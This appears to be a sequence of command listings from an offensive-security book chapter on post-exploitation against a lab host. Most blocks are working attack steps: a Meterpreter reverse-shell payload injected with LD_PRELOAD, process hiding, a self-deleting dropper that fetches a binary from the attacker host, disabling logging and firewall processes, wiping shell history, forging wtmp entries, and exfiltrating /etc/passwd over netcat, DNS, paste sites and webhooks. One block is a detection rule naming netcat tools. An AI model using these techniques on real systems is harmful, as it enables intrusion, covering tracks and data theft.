["```\n$ **msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.10.1 LPORT=2222 -f**\n**elf-so > meterpreter.so** \n```", "```\n$ **file meterpreter.so**\n\nmeterpreter.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),\ndynamically linked, stripped \n```", "```\n$ **scp -O meterpreter.so backup@172.16.10.13:/tmp**\n```", "```\nmsf > **use exploit/multi/handler**\nmsf > **set payload linux/x64/meterpreter/reverse_tcp**\nmsf > **set LHOST 172.16.10.1**\nmsf > **set LPORT 2222**\nmsf > **run** \n```", "```\n$ **ps aux**\n\nUSER    PID %CPU %MEM   STAT START   TIME COMMAND\nroot      1  0.0  0.0   Ss   Nov23   0:00 /bin/sh -c service ssh restart && tail -f /dev/null\n**root     17  0.0  0.0   Ss   Nov23   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups**\nroot     28  0.0  0.0   S    Nov23   0:38 tail -f /dev/null\nroot  30238  0.0  0.0   Ss   Nov28   0:00 bash\nroot  37405  100  0.0   R+   03:14   0:00 ps aux \n```", "```\n$ **LD_PRELOAD=/tmp/meterpreter.so ssh**\n```", "```\n[*] Started reverse TCP handler on 172.16.10.1:2222\n[*] Sending stage (3045348 bytes) to 172.16.10.13\n[*] Meterpreter session 1 opened (172.16.10.1:2222 -> 172.16.10.13:46048)\n\nmeterpreter > \n```", "```\n$ **git clone https://github.com/gianlucaborello/libprocesshider**\n$ **cd libprocesshider** \n```", "```\n$ **sed -i s'/evil_script.py/cron/'g processhider.c**\n```", "```\n$ **make**\n```", "```\n# **echo /tmp/libprocesshider.so >> /etc/ld.so.preload**\n```", "```\n# **ps aux**\n\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0   2752   972 ?        Ss   03:23   0:00 /bin/sh -c service ssh re...\nroot          29  0.0  0.0   3760  2132 ?        Ss   03:23   0:00 /usr/sbin/cron -P\nroot          30  0.0  0.0   2684   904 ?        S    03:23   0:00 tail -f /dev/null\nroot          34  0.0  0.0   4524  3892 pts/0    Ss+  03:23   0:00 bash\nbackup        68  0.0  0.0   4524  3836 pts/1    Ss   03:26   0:00 -bash\nbackup       113  0.0  0.0   4524  3748 pts/2    Ss   03:38   0:00 -bash\nbackup       116  100  0.1   8224  4064 pts/2    R+   03:38   0:00 ps aux \n```", "```\n# **top -n 1**\n\nTasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie\n%Cpu(s):100.0 us,  0.0 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   3920.9 total,   1333.0 free,   1350.8 used,   1598.0 buff/cache\nMiB Swap:   1024.0 total,    681.3 free,    342.7 used.   2570.2 avail Mem\n\n    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n      1 root      20   0    2752    972    868 S   0.0   0.0   0:00.02 sh\n     29 root      20   0    3760   2316   2080 S   0.0   0.1   0:00.00 cron\n     30 root      20   0    2684    904    800 S   0.0   0.0   0:00.12 tail\n     34 root      20   0    4524   3972   3296 S   0.0   0.1   0:00.19 bash\n     68 backup    20   0    4524   3836   3224 S   0.0   0.1   0:00.01 bash\n    153 root      20   0    8728   4728   2828 R   0.0   0.1   0:00.01 top \n```", "```\n# **cat /proc/17/comm**\n\nsshd \n```", "```\nalert if os_type == \"Linux\" AND process_name in(\"ping\", \"nping\", \"hping\",\n\"hping2\", \"hping3\", \"nc\", \"ncat\", \"netcat\", \"socat\") \n```", "```\n$ **ps aux | grep -o '\\[.*]' | head -8**\n\n[kthreadd]\n[rcu_gp]\n[rcu_par_gp]\n[slub_flushwq]\n[netns]\n[mm_percpu_wq]\n[rcu_tasks_kthread]\n[rcu_tasks_rude_kthread] \n```", "```\n#!/bin/bash\nWORK_DIR=\"/tmp\"\n❶ RANDOM_BIN_NAMES=(\"[cpuhp/0]\" \"[khungtaskd]\" \"[blkcg_punt_biio]\"\n\"[ipv8_addrconf]\" \"[mlb]\" \"[kstrrp]\" \"[neetns]\" \"[rcu_gb]\")\n❷ RANDOMIZE=$((RANDOM % 7))\n❸ BIN_FILE=\"${RANDOM_BIN_NAMES[${RANDOMIZE}]}\"\nFULL_BIN_PATH=\"${WORK_DIR}/${BIN_FILE}\"\n\nself_removal(){\n  shred -u -- \"$(basename \"$0\")\" && rm -f -- \"${FULL_BIN_PATH}\"\n}\n\n❹ if command -v curl 1> /dev/null; then\n❺ curl -s \"http://172.16.10.1:8080/system_sleep\" -o \"${FULL_BIN_PATH}\"\n  if [[-s \"${FULL_BIN_PATH}\"]]; then\n    chmod +x \"${FULL_BIN_PATH}\"\n  ❻ export PATH=\"${WORK_DIR}:${PATH}\"\n  ❼ nohup \"${BIN_FILE}\" &> /dev/null &\n  fi\nfi\n\n8 trap self_removal EXIT \n```", "```\n$ **cd ~/Black-Hat-Bash/ch12**\n$ **gcc system_sleep.c -o system_sleep**\n$ **ls -ld system_sleep**\n\n-rwxrwxr-x 1 kali 15968 Dec  3 14:20 system_sleep \n```", "```\n$ **python3 -m http.server 8080**\n```", "```\n$ **bash binary_name_rotation.sh**\n$ **ps aux**\n\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0   2752   972 ?        Ss   Nov30   0:00 /bin/sh -c service ssh re...\nroot          17  0.0  0.1  14924  4716 ?        Ss   Nov30   0:00 sshd: /usr/sbin/sshd [lis...\nroot          29  0.0  0.0   3760  2316 ?        Ss   Nov30   0:03 /usr/sbin/cron -P\nroot          30  0.0  0.0   2684   904 ?        S    Nov30   0:23 tail -f /dev/null\nroot       28050  0.0  0.0   4612  3760 pts/1    Ss   17:49   0:00 bash\n**root       28772  0.0  0.0   2484  1352 pts/1    S    19:25   0:00 [kstrrp]**\nroot       28775  0.0  0.0   2732   860 pts/1    S    19:25   0:00 sh -c sleep 100 \n```", "```\n$ **mount | grep \"/dev/shm\"**\n\nshm on /dev/shm type tmpfs (rw,**nosuid,nodev,noexec**,relatime,size=65536k,inode64) \n```", "```\n$ **grep /dev/shm /proc/self/mountinfo**\n\n964 959 0:104 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k,inode64 \n```", "```\n# **mount -o \"remount,$(mount | grep shm | grep -oP '\\(\\K[^\\)]+' | sed** **s'/noexec/exec/')\" /dev/shm**\n```", "```\n# **service --status-all**\n\n [-]  atd\n [+]  cron\n [-]  dbus\n [?]  hwclock.sh\n [-]  postfix\n [-]  procps\n [+]  ssh \n```", "```\n# **service atd stop**\n```", "```\n# **systemctl list-units --type=service**\n\n  UNIT                        LOAD   ACTIVE SUB     DESCRIPTION\n  atd.service                 loaded active running Deferred execution scheduler\n  colord.service              loaded active running Manage, install and generate color profiles\n  console-setup.service       loaded active exited  Set console font and keymap\n  containerd.service          loaded active running containerd container runtime \n```", "```\n# **systemctl stop cron**\n```", "```\n# **systemctl disable atd**\n```", "```\n# **chkconfig atd off**\n```", "```\n$ **for pid in $(ps -ef | grep -e \"iptables\" -e \"cron\" -e \"syslog\" |**\n**awk '{print $2}'); do kill -9 \"${pid}\"; done** \n```", "```\n$ **export HISTCONTROL=ignorespace**\n$  **echo hello world  # echo is prepended with a space.**\n\nhello world\n$ **history | tail -5**\n\n38  ps aux\n39  clear\n40  history | tail -5\n41  export HISTCONTROL=ignorespace\n42  history | tail -5 \n```", "```\n$ **history -c && history -w**\n```", "```\n$ **export HISTSIZE=0 && export HISTFILE=/dev/null**\n```", "```\n$ **ssh backup@172.16.10.13**\n```", "```\n$ **last**\n\nbackup   pts/1        **172.16.10.1**      Thu Dec  7 03:31    gone - no logout\nwtmp begins Thu Dec  7 03:31:28 \n```", "```\n$ **ssh root@172.16.10.13**\n```", "```\n# **xxd /var/log/wtmp**\n\n00000000: 0700 0000 3bf3 0000 7074 732f 3100 0000  ....;...pts/1...\n00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................\n00000020: 0000 0000 0000 0000 7473 2f31 6261 636b  ........ts/1back\n00000030: 7570 0000 0000 0000 0000 0000 0000 0000  up..............\n00000040: 0000 0000 0000 0000 0000 0000 3137 322e  ............172.\n00000050: **3136** 2e31 302e 3100 0000 0000 0000 0000  16.10.1......... \n```", "```\n# **sed -i s'/\\x31\\x36/\\x35\\x30/'g /var/log/wtmp**\n```", "```\n$ **last**\n\nbackup   pts/1        **172.50.10.1**      Thu Dec  7 03:31    gone - no logout \n```", "```\n$ **lastb**\n\nidontexit ssh:notty    172.16.10.1      Thu Dec  7 03:54 - 03:54  (00:00)\nbackup    ssh:notty    172.16.10.1      Thu Dec  7 03:30 - 03:30  (00:00) \n```", "```\n$ **echo -n \"Secret Data\" | base64**\n\nU2VjcmV0IERhdGE= \n```", "```\n$ **echo \"U2VjcmV0IERhdGE=\" | base64 -d**\n\nSecret Data \n```", "```\n$ **text=\"Hello!\"**\n$ **rounds=10; for i in $(seq ${rounds}); do text=\"$(echo \"${text}\" | base64)\"; done** \n```", "```\n$ **echo $text**\n\nVm0wd2QyVkZOVWRXV0doVFYwZDRWRll3Wkc5WFZsbDNXa1JTVjJKR2JETlhhMUpUVmpGYWRHVkdX\nbFpOYWtFeFZtMTRZV014WkhWaApSbHBPWVd0RmVGWnNVa2RaVjFKSFZtNUdVd3BpU0VKdldWaHdW\nMlZXV25OV2JVWmFWbXh3ZVZSc1duTldkM0JwVW01Q1ZWZFhkRmRYCmJWWnpWMnhXVldKWVVuSlph\nMVpMVlRGc2RXSXpaRlJrTWpnNVEyYzlQUW89Cg==\n\n$ **rounds=10; for i in $(seq ${rounds}); do text=\"$(echo \"${text}\" | base64 -d)\"; done**\n$ **echo $text**\n\nHello! \n```", "```\n$ **echo -n \"Secret Data\" | xxd -p**\n\n5365637265742044617461 \n```", "```\n$ **echo \"5365637265742044617461\" | xxd -r -p**\n\nSecret Data \n```", "```\n$ **echo \"Secret Data\" | xxd -p | base64**\nNTM2NTYzNzI2NTc0MjA0NDYxNzQ2MTBhCg== \n```", "```\n$ **MY_SECRET=\"Black Hat Bash\"**\n$ **echo \"${MY_SECRET}\" | openssl enc -aes256 -pbkdf2 -base64** \n```", "```\nenter AES-256-CBC encryption password:\nVerifying - enter AES-256-CBC encryption password:\n\nU2FsdGVkX18u2T5pZ+owj/NU0Y8e6 + 2uCZQa2agr5WI= \n```", "```\n$ **echo \"U2FsdGVkX18u2T5pZ+owj/NU0Y8e6** **+ 2uCZQa2agr5WI=\" | openssl aes-256-cbc -d -pbkdf2 -base64**\nenter AES-256-CBC decryption password:\nBlack Hat Bash \n```", "```\n$ **echo \"No Starch Press\" | sed 'y/abcdefghijklmnopqrstuvwxyzABCDEFGHIJK**\n**LMNOPQRSTUVWXYZ/nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM/'**\n\nAb Fgnepu Cerff \n```", "```\n$ **echo \"Ab Fgnepu Cerff\" | sed 'y/nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABC**\n**DEFGHIJKLM/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/'**\n\nNo Starch Press \n```", "```\n$ **socat TCP-LISTEN:12345,reuseaddr,fork - | xxd -r -p**\n```", "```\n$ **xxd -p /etc/passwd | nc 172.16.10.1 12345**\n```", "```\nsocat TCP-LISTEN:12345,reuseaddr,fork - | xxd -r -p\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n`--snip--` \n```", "```\n$ **sudo dnschef \\**\n **--fakedomains blackhatbash.com \\**\n **--fakeip 127.0.0.1 --interface 0.0.0.0 \\**\n **--logfile dnschef.log** \n```", "```\n$ **for i in $(xxd -p -c 30 /etc/passwd); do dig $i.blackhatbash.com @172.16.10.1; done**\n```", "```\n23:51:22) [*] DNSChef started on interface: 0.0.0.0\n`--snip--`\n(23:51:22) [*] Cooking A replies to point to 127.0.0.1 matching: blackhatbash.com\n(23:51:22) [*] DNSChef is active.\n(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'\nfor 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173.blackhatbash.com to 127.0.0.1\n(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'\nfor 680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f736269.blackhatbash.com to 127.0.0.1\n(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'\nfor 6e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a.blackhatbash.com to 127.0.0.1\n`--snip--` \n```", "```\n$ **echo 726f6f743a783a303a303a726f6f743a2f726f6f74.blackhatbash.com | xxd -r -p**\n\nroot:x:0:0:root:/root:/bin/bash \n```", "```\n$ **sed -n 's/.*for \\(.*\\) to .*/\\1/p' dnschef.log  | awk -F'.' '{print $1}' | xxd -r -p**\n```", "```\n`some-command` | curl -F 'sprunge=<-' http:`//my-custom-sprunge-server.local`\n```", "```\n$ **echo \"Black Hat Bash\" | curl -F 'sprunge=<-' http:****`//my-custom-sprunge-server.local`**\nhttp:`//my-custom-sprunge-server.local/7gWETD`\n\n$ **curl http:****`//my-custom-sprunge-server.local/7gWETD`**\nBlack Hat Bash \n```", "```\n$ **echo \"Black Hat Bash\" | curl -F \"content=<-\" https://dpaste.com/api/v2/**\n```", "```\n$ **curl -X POST -H 'Content-type: application/json' -d \"{\\\"text\\\":\\\"$(cat**\n**/etc/hosts)\\\"}\" https://hooks.slack.com/services/some/hook** \n```", "```\n$ **for line in $(seq 1 1000); do echo \"line number ${line}\"; done >> 1000_line_file.txt**\n```", "```\n$ **split -l 500 -d --verbose 1000_line_file.txt**\n\ncreating file 'x00'\ncreating file 'x01' \n```", "```\n$ **split -d --verbose --bytes=5000 1000_line_file.txt**\n\ncreating file 'x00'\ncreating file 'x01'\ncreating file 'x02'\ncreating file 'x03' \n```", "```\n$ **ls -l x0***\n\n-rw-r--r-- 1 kali kali 5000 Dec  9 22:56 x00\n-rw-r--r-- 1 kali kali 5000 Dec  9 22:56 x01\n-rw-r--r-- 1 kali kali 5000 Dec  9 22:56 x02\n-rw-r--r-- 1 kali kali  893 Dec  9 22:56 x03 \n```", "```\n$ **split -d --verbose --number=10 1000_line_file.txt**\ncreating file 'x00'\ncreating file 'x01'\n`--snip--`\ncreating file 'x08'\ncreating file 'x09' \n```", "```\n$ **socat TCP-LISTEN:12345,reuseaddr,fork -**\n```", "```\n$ **cd /tmp**\n$ ❶ **for file in $(split /etc/passwd -l 5 -d --verbose); do** ❷ **for prefix**\n**in $(echo \"${file}\" | awk '{print $NF}' | grep -o '[0-9]*'); do** ❸ **echo**\n**\"cat /tmp/x${prefix} | nc 172.16.10.1 12345\" | at now \"+${prefix}**\n**minutes\"; done; done** \n```", "```\n$ **atq**\n44    Sun Dec 10 04:12:00 a root\n43    Sun Dec 10 04:11:00 a root\n45    Sun Dec 10 04:13:00 a root\n46    Sun Dec 10 04:14:00 a root\n47    Sun Dec 10 04:15:00 a root \n```"]